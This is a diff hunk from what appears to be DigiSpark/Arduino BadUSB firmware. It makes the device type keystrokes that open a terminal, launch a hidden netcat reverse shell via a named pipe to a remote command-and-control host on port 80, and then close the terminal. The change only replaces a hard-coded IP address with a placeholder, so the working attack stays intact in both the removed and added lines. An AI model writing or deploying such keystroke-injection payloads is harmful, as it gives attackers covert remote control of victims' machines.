@@ -18,7 +18,7 @@ void loop() {
   delay(1000); // All delays for the purpose of timing and keeping keyboard connection up
   DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT); // press Ctl+Alt+t to open terminal if not exist 
   delay(1000);
-  DigiKeyboard.println("screen -dm bash -c \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 18.194.65.200 80 > /tmp/f \""); //Deploy reverseshell in the back ground
+  DigiKeyboard.println("screen -dm bash -c \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.xx.xx.xx 80 > /tmp/f \""); //// repalce Xs with CnC IP/Domain, Deploy reverseshell in the back ground
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // press enter
   delay(1000);
   DigiKeyboard.println("exit"); // close the terminal
